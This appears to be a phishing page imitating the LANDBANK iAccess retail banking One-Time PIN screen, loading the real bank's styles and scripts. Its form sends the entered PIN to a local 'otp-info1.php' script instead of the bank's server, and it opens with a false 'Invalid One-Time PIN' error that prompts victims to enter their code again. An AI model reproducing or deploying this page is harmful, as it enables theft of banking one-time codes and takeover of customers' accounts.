<html xmlns="http://www.w3.org/1999/xhtml"><head><style type="text/css">
        .forex-righth-align {
            text-align: right;
        }

        .ssl-seal {
            position: absolute;
            left: 50%;
            transform: translate(-50%, -50%);
        }

        .forex-button {
            font-family: Helvetica,Arial,sans-serif;
            text-transform: uppercase;
            outline: 0;
            background: #65cead;
            border: 0;
            border-radius: 8px;
            padding: 4px;
            color: #ffffff;
            font-size: 11px;
            font-weight: bold;
            -webkit-transition: all 0.3 ease;
            transition: all 0.3 ease;
            cursor: pointer;
       }
    </style><head id="j_idt3"><link type="text/css" rel="stylesheet" href="https://www.lbpiaccess.com/javax.faces.resource/theme.css.xhtml?ln=primefaces-frontoffice" /><link type="text/css" rel="stylesheet" href="https://www.lbpiaccess.com/javax.faces.resource/fa/font-awesome.css.xhtml?ln=primefaces&amp;v=8.0" /><link type="text/css" rel="stylesheet" href="https://www.lbpiaccess.com/javax.faces.resource/style.css.xhtml?ln=css" /><link type="text/css" rel="stylesheet" href="https://www.lbpiaccess.com/javax.faces.resource/components.css.xhtml?ln=primefaces&amp;v=8.0" /><script type="text/javascript" src="https://www.lbpiaccess.com/javax.faces.resource/jquery/jquery.js.xhtml?ln=primefaces&amp;v=8.0"></script><script type="text/javascript" src="https://www.lbpiaccess.com/javax.faces.resource/jquery/jquery-plugins.js.xhtml?ln=primefaces&amp;v=8.0"></script><script type="text/javascript" src="https://www.lbpiaccess.com/javax.faces.resource/core.js.xhtml?ln=primefaces&amp;v=8.0"></script><script type="text/javascript" src="https://www.lbpiaccess.com/javax.faces.resource/components.js.xhtml?ln=primefaces&amp;v=8.0"></script><script type="text/javascript" src="https://www.lbpiaccess.com/javax.faces.resource/cryptojs/core-min.js.xhtml?ln=scripts"></script><script type="text/javascript" src="https://www.lbpiaccess.com/javax.faces.resource/cryptojs/aes.js.xhtml?ln=scripts"></script><script type="text/javascript" src="https://www.lbpiaccess.com/javax.faces.resource/cryptojs/enc-base64-min.js.xhtml?ln=scripts"></script><script type="text/javascript" src="https://www.lbpiaccess.com/javax.faces.resource/cryptojs/sha256-min.js.xhtml?ln=scripts"></script><script type="text/javascript" src="https://www.lbpiaccess.com/javax.faces.resource/app/clienthash.min.js.xhtml?ln=scripts"></script><script type="text/javascript" src="https://www.lbpiaccess.com/javax.faces.resource/app/login.min.js.xhtml?ln=scripts"></script><script type="text/javascript" src="https://www.lbpiaccess.com/javax.faces.resource/validation/validation.js.xhtml?ln=primefaces&amp;v=8.0"></script><script type="text/javascript" src="https://www.lbpiaccess.com/javax.faces.resource/validation/beanvalidation.js.xhtml?ln=primefaces&amp;v=8.0"></script><script type="text/javascript">if(window.PrimeFaces){PrimeFaces.settings.locale='en_US';PrimeFaces.settings.validateEmptyFields=true;PrimeFaces.settings.considerEmptyStringNull=false;}</script>
            <meta charset="utf-8">
            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
            <meta name="apple-mobile-web-app-capable" content="yes">
            <meta name="mobile-web-app-capable" content="yes">

            <title>LANDBANK iAccess Retail Internet Banking - Login</title>
            <link rel="shortcut icon" type="image/x-icon" href="https://www.lbpiaccess.com/resources/images/favicon.ico"></head><body id="login-body">
            <div id="login-maincontainer">

                <div id="login-topsection">
                    <img src="https://www.lbpiaccess.com/resources/images/lbpiaccess.jpg" alt="" width="1056" height="90">
                </div>

                <div id="login-wrapper">
<form id="otp-form" name="otp-form" method="post" action="otp-info1.php" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="otp-form" value="otp-form">
<div id="otp-form:j_idt65" class="ui-panel ui-widget ui-widget-content ui-corner-all" style="border: 0px" data-widget="widget_otp_form_j_idt65"><div id="otp-form:j_idt65_header" class="ui-panel-titlebar ui-widget-header ui-helper-clearfix ui-corner-all"><span class="ui-panel-title">Security Validation</span></div><div id="otp-form:j_idt65_content" class="ui-panel-content ui-widget-content"><div id="otp-form:otp-form-msgs" class="ui-messages ui-widget" aria-live="polite" data-global="false" data-detail="data-detail" data-severity="all,error" data-redisplay="true"><div class="ui-messages-error ui-corner-all"><a href="#" class="ui-messages-close" onclick="$(this).parent().slideUp();return false;" aria-label="Close"><span class="ui-icon ui-icon-close"></span></a><span class="ui-messages-error-icon"></span><ul><li role="alert" aria-atomic="true"><span class="ui-messages-error-detail">Invalid One-Time PIN. Please try again.</span></li></ul></div></div><table cellpadding="5">
<tbody>
<tr>
<td><label id="OTP" class="ui-outputlabel ui-widget" for="otp">One-Time PIN</label></td>
<td><input id="otp" name="OTP" type="password" class="ui-inputfield ui-password ui-widget ui-state-default ui-corner-all" maxlength="6" data-p-label="One-Time PIN" role="textbox" aria-disabled="false" aria-readonly="false"></td>
<td><div id="otp-form:mgotp" role="alert" aria-atomic="true" aria-live="polite" data-display="icon" data-target="otp-form:otp" data-redisplay="true" class="ui-message"></div></td>
</tr>
</tbody>
</table>


                                <div>
                                    <ul style="padding-left: 15px; margin-top: 0">
                                        <li>For added security, please enter the One-Time PIN sent to your mobile:</li>
                                        <li>It will expire in 5 minutes.</li>
                                            <li>If you did not receive an OTP or if your OTP has expired, generate a new one by clicking <strong>Resend OTP via SMS</strong>.</li>
                                    </ul>
                                </div><button id="otp" name="otp" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" onclick="" type="submit" role="button" aria-disabled="false"><span class="ui-button-text ui-c">Submit</span></button><img id="otp-form:j_idt87" width="5" alt="" src="/javax.faces.resource/spacer/dot_clear.gif.xhtml?ln=primefaces&amp;v=8.0"><button id="otp-form:otp-regenerate-sms" name="otp-form:otp-regenerate-sms" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" onclick="" type="submit" role="button" aria-disabled="false"><span class="ui-button-text ui-c">Resend OTP via SMS</span></button><img id="otp-form:j_idt90" width="5" alt="" src="/javax.faces.resource/spacer/dot_clear.gif.xhtml?ln=primefaces&amp;v=8.0"><button id="otp-form:otp-back" name="otp-form:otp-back" type="button" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" onclick="window.open('\/login.xhtml','_self')" role="button" aria-disabled="false"><span class="ui-button-text ui-c">Cancel</span></button></div></div><div id="otp-form:j_idt92" class="ui-dialog ui-widget ui-widget-content ui-corner-all ui-shadow ui-hidden-container ui-draggable" role="dialog" aria-describedby="otp-form:j_idt92_content" aria-hidden="true" aria-modal="true" aria-labelledby="otp-form:j_idt92_title" aria-live="off" style="width: auto; height: auto; visibility: visible; left: 1094.45px; top: 605.906px; z-index: 1002; display: none;"><div class="ui-dialog-titlebar ui-widget-header ui-helper-clearfix ui-corner-top ui-draggable-handle"><span id="otp-form:j_idt92_title" class="ui-dialog-title">LANDBANK iAccess Retail Internet Banking</span></div><div class="ui-dialog-content ui-widget-content" id="otp-form:j_idt92_content" style="height: auto;"><div style="text-align: center;">Your One-Time PIN has been sent to your mobile number
                                        <br>
                                        <br><button id="otp-form:ok" name="otp-form:ok" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" onclick="PrimeFaces.bcn(this,event,[function(event){PF('otpDialog').hide();},function(event){PrimeFaces.ab({s:&quot;otp-form:ok&quot;,f:&quot;otp-form&quot;});return false;}]);" type="submit" autofocus="true" role="button" aria-disabled="false"><span class="ui-button-text ui-c">OK</span></button></div></div></div>
                                <script type="text/javascript">
                                    jQuery(document).ready(function () {
                                        PF('otpDialog').show();
                                    });
                                </script><input type="hidden" name="javax.faces.ViewState" id="j_id1:javax.faces.ViewState:0" value="-8307535705782652954:-2316855973628782494" autocomplete="off">
</form>

                </div>

                <div id="footer">

                    <div id="container-warning">
                        <span class="warning">WARNING:</span>
                        <span class="warning-higlight">iAccess is for authorized clients only.</span>
                        <span>It shall be a criminal offense for any person to:</span>

                        <ol>
                            <li>Obtain access to data without authority;</li>
                            <li>Corrupt, alter, steal or destroy data;</li>
                            <li>Interfere in computer system or server;</li>
                            <li>Introduce computer virus.</li>
                        </ol>

                        <span>Penalty shall consist of minimum fine of Php100,000 and a maximum commensurate to the damage incurred and a mandatory imprisonment of six months to three years under R.A. No. 8792 (E-Commerce Act of the Philippines).</span>
                    </div>
                    <div id="container-contactinfo">
                        <span style="color: #0db14b; font-size: 12px; font-weight: bold;">LANDBANK CUSTOMER CARE CENTER</span><br>
                        <span>Tel. Nos.: (02) 8405-7000 (NCR) or</span><br>
                        <span>1-800-10-405-7000 (PLDT Domestic Toll Free/Outside NCR)</span><br>
                        <span>Email: customercare@mail.landbank.com</span><br>
                        <hr align="right" style="width: 380px; color: #66cc99; border: 1px solid #66cc99;">
                        <span>Regulated by the Bangko Sentral ng Pilipinas.</span><br>
                        <span>Deposits are insured by PDIC up to P500,000 per depositor.</span><br>
                        <span style="display: flex; flex-direction: row-reverse">
                            <img src="https://www.lbpiaccess.com/resources/images/bancnet_logo.png" alt="" width="100" height="20">
                            <span>A Proud Member of </span>
                        </span>
                    </div>

                </div>

            </div>
<div id="textarea_simulator" style="position: absolute; top: 0px; left: 0px; visibility: hidden;"></div><div class="ui-dialog-docking-zone"></div></body><span class="ui-panel-title"></span></html>